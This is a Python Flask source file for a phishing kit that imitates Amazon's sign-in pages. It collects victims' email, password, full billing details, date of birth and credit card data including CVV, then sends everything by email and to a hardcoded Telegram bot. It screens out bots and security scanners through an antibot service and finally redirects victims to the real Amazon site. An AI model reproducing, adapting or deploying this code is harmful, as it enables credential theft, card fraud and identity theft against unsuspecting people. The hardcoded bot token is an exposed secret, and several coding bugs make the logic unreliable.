from flask import Flask, request, abort, render_template, redirect, url_for, make_response
import config
import requests, json
import smtplib
from email.message import EmailMessage
import datetime



app = Flask(__name__)

expire_date = datetime.datetime.now()
expire_date = expire_date + datetime.timedelta(days=1)

def telegram(m):
    s = requests.Session()
    r = s.get(f'https://api.telegram.org/bot5965813549:AAFJa8dmjpD55ZKPhqrxse8P_UF9SXYhnv8/sendMessage?chat_id=-1001823807122&text={m}')
    sq = r.content
    return sq


def save(s, i):
    f = open(s, 'a+')
    f.writelines(f'\n{i}')
    f.close()


def cekbin(ccn):
    s = requests.Session()
    bin = ccn[0:8]
    req = s.get(f'https://lookup.binlist.net/{bin}')
    sc = req.content
    js = json.loads(sc)
    return js


def send_mail(subject, message, from_email):
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = from_email
    msg['To'] = config.emails_result
    msg.set_content(message)
    server = smtplib.SMTP(host='localhost', port=25)
    server.send_message(msg)
    server.quit()


def antibot(ipx, ua):
    s = requests.Session()
    api = config.antibot_key
    req = s.get(f'https://antibot.pw/api/v2-blockers?ip={ipx}&apikey={api}&ua={ua}')
    sc = req.content
    js = json.loads(sc)
    return js



@app.route("/", methods=['GET', 'POST'] )
def index():
    ua = request.headers.get('User-Agent')
    ipx = request.remote_addr
    cek = antibot(ipx, ua)
    cn = cek['info']['ipinfo']['country']
    full = f'\n{ipx} || {ua}'
    vis = f'\n{cn} || {ipx} || {ua}'
    if request.method == ['POST']:
        key = request.form['akseskey']
        if cek['is_bot'] == True:
            save('bot.txt', full)
            return render_template('cloudflare.html')
        if config.onetime_access == True:
            if ipx in 'onetime.txt':
                return redirect("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=900&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fpath%3D%252Fgp%252Fyourstore%252Fhome%26signIn%3D1%26useRedirectOnSuccess%3D1%26action%3Dsign-out%26ref_%3Dnav_AccountFlyout_signout&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0", code=302)
        save('visitor.txt', vis)
        return redirect(url_for('signin', key=key))
    else:
        return render_template('session.html')


@app.route("/signin/<key>", methods=['GET', 'POST'] )
def signin(key):
    if request.method == 'POST':
        email = request.form['ap_email']
        key = request.form['akseskey']
        res = make_response(redirect(url_for('signins', key=key, mail=email)))
        res.set_cookie('emails', email, expires=expire_date)
        return res
    else:
        return render_template('login.html')


@app.route("/signins/<key>", methods=['GET', 'POST'])
def signins(key):
    if request.method == 'POST':
        key = request.form['akseskey']
        passw = request.form['ap_password']
        email = request.cookies.get['emails']
        res = make_response(redirect(url_for('secure', key=key, mail=email)))
        res.set_cookie('pw', passw, expires=expire_date)
        return res
    else:
        email = request.cookies.get['emails']
        return render_template('password.html', mail=email)


@app.route("/secure/<key>", methods=['GET', 'POST'])
def secure(key):
    ua = request.headers.get('User-Agent')
    ipx = request.remote_addr
    cek = antibot(ipx, ua)
    cn = cek['info']['ipinfo']['country']
    email = request.cookies.get['emails']
    passw = request.cookies.get['pw']
    sb = f'Login Amazon {cn} | {ipx}'
    frm = 'logins@python-loversz.net'
    message = f'''
    | Login Amazon
    ============================== 
    | email     = {email}
    | password  = {passw}
    ==============================
    | Info Details
    ===============================
    | ip        = {ipx}
    | Country   = {cn}
    | user agent= {ua}
    '''
    send_mail(sb, message, frm)
    telegram(message)
    if "iphone" or "android" in ua:
        if request.method == 'POST':
            key = request.form['akseskey']
            res = make_response(redirect(url_for('billing', key=key, cn=cn)))
            res.set_cookie('cn', cn, expires=expire_date)
            return res
        return render_template('alert.mobile.html')
    else:
        if request.method == 'POST':
            key = request.form['akseskey']
            res = make_response(redirect(url_for('billing', key=key, cn=cn)))
            res.set_cookie('cn', cn, expires=expire_date)
            return res
        return render_template('alert.desktop.html')


@app.route("/billing/<key>", methods=['GET', 'POST'])
def billing(key):
    cn = request.cookies.get['cn']
    if request.method == 'POST':
            key = request.form['akseskey']
            fname = request.form['fullname']
            dob = request.form['dob']
            addr = request.form['address']
            city = request.form['cityp']
            region = request.form['region']
            zip = request.form['zipcode']
            phone = request.form['phone']
            count = request.form['country']

            res = make_response(redirect(url_for('card', key=key)))
            res.set_cookie('fname', fname, expires=expire_date)
            res.set_cookie('dob', dob, expires=expire_date)
            res.set_cookie('addrs', addr, expires=expire_date)
            res.set_cookie('city', city, expires=expire_date)
            res.set_cookie('region', region, expires=expire_date)
            res.set_cookie('zip', zip, expires=expire_date)
            res.set_cookie('phone', phone, expires=expire_date)
            res.set_cookie('country', count, expires=expire_date)

            return res
    return render_template('billing.html', cn=cn)


@app.route("/card/<key>", methods=['GET', 'POST'])
def card(key):
    ua = request.headers.get('User-Agent')
    country = request.cookies.get['country']
    if 'Japan' in country:
        if request.method == 'POST':
                key = request.form['akseskey']
                cname = request.form['namecard']
                ccn = request.form['ccn']
                cvv = request.form['cvv']
                expm = request.form['expmonth']
                expy = request.form['expyear']
                res = make_response(redirect(url_for('send', key=key)))
                res.set_cookie('cname', cname, expires=expire_date)
                res.set_cookie('ccn', ccn, expires=expire_date)
                res.set_cookie('cvv', cvv, expires=expire_date)
                res.set_cookie('expm', expm, expires=expire_date)
                res.set_cookie('expy', expy, expires=expire_date)
                return res
        return render_template('card.mobile.html')
    else:
        if request.method == 'POST':
                key = request.form['akseskey']
                cname = request.form['namecard']
                ccn = request.form['ccn']
                cvv = request.form['cvv']
                expm = request.form['expmonth']
                expy = request.form['expyear']
                res = make_response(redirect(url_for('send', key=key)))
                res.set_cookie('cname', cname, expires=expire_date)
                res.set_cookie('ccn', ccn, expires=expire_date)
                res.set_cookie('cvv', cvv, expires=expire_date)
                res.set_cookie('expm', expm, expires=expire_date)
                res.set_cookie('expy', expy, expires=expire_date)
                return res
        return render_template('card.mobile.html')
    




@app.route("/done/<key>", methods=['GET', 'POST'])
def send(key):
    ua = request.headers.get('User-Agent')
    ipx = request.remote_addr
    ccn = request.cookies.get['ccn']
    cname = request.cookies.get['cname']
    cvv = request.cookies.get['cvv']
    expm = request.cookies.get['expm']
    expy = request.cookies.get['expy']
    fname = request.cookies.get['fname']
    dob = request.cookies.get['dob']
    addr = request.cookies.get['addrs']
    city = request.cookies.get['city']
    region = request.cookies.get['region']
    phone = request.cookies.get['phone']
    zip = request.cookies.get['zip']
    x = ccn.replace(" ", "")
    bind = x[0:8]
    bin = cekbin(bind)
    scheme = bin['scheme']
    typee = bin['type']
    bank = bin['bank']['name']
    cek = antibot(ipx, ua)
    cn = cek['info']['ipinfo']['country']
    sb = f'{bank} - {scheme} {typee} || {cn}'
    frm = 'logins@python-loversz.net'
    message = f'''
    | Credit & Debit Info
    | BIN   = {bank} - {scheme} {typee}
    ============================== 
    | Holder name   = {cname}
    | Card Number   = {ccn}
    | expired       = {expm}/{expy}
    | cvv           = {cvv}
    ==============================
    | JP VBV Details
    ==============================
    | WEB ID    =
    | Password  = 
    ==============================
    | Billing Details
    ==============================
    | Full name = {fname}
    | dob       = {dob}
    | address   = {addr}
    | Region    = {region}
    | city      = {city}
    | zip code  = {zip}
    | Phone     = {phone}
    ==============================
    | Info Details
    ===============================
    | ip        = {ipx}
    | Country   = {cn}
    | user agent= {ua}
    '''
    send_mail(sb, message, frm)
    telegram(message)
    if "iphone" or "android" in ua:
        return render_template('done.mobile.html', key=key)
    else:
        return render_template('done.html', key=key)


@app.route("/waiting", methods=['GET', 'POST'])
def done():
    return redirect('https://www.amazon.com/ap/signin?openid.pape.max_auth_age=900&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fpath%3D%252Fgp%252Fyourstore%252Fhome%26signIn%3D1%26useRedirectOnSuccess%3D1%26action%3Dsign-out%26ref_%3Dnav_AccountFlyout_signout&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0', code=302)



if __name__ == "__main__":
    app.run(host='0.0.0.0')